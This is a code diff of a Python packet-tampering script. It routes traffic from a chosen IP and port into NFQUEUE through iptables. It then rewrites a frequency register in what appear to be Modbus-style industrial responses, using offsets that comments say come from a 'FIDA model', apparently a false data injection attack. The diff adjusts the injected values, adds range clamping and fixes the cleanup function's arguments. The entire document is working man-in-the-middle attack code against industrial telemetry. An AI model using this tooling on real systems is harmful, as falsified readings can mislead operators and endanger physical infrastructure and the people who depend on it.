@@ -6,8 +6,10 @@ change_values = []
 
 def get_values():
     global change_values
-    change_values = list(range(100))
-    return change_values
+    ## add generated values from FIDA model here
+    change_values = list(range(10000,12000,1000))
+    ## Testing with random values in List
+    return
 
 def modify_packet(scapy_packet):
     global change_values
@@ -21,13 +23,17 @@ def modify_packet(scapy_packet):
             if first_register == 101 and len(payload) > 100:
                 hz_register = int.from_bytes(data[32:34], byteorder="big")
                 print("Orginal Frequency:", hz_register)
-                if len(change_values) == 0: change_values = get_values()
+                if len(change_values) == 0: get_values()
                 change_value=change_values.pop(0)
                 
                 #debug
                 print("Change Value:", change_value)
                 
                 new_sec_register = hz_register + change_value
+                if new_sec_register < 0:
+                    new_sec_register = -new_sec_register
+                if new_sec_register > 65535:
+                    new_sec_register = 65535-change_value
                 new_sec_register_bytes = new_sec_register.to_bytes(2, byteorder="big")
                 modified_payload = payload[:41] + new_sec_register_bytes + payload[43:]
 
@@ -55,7 +61,7 @@ def modify_packet(scapy_packet):
 def setup_iptables(ip,port):
     os.system(f'iptables -I FORWARD -p tcp --sport {port} -s {ip} -j NFQUEUE --queue-num 1')
 
-def cleanup_iptables(ip):
+def cleanup_iptables(ip, port):
     os.system(f'iptables -D FORWARD -p tcp --sport {port} -s {ip} -j NFQUEUE --queue-num 1')
 
 
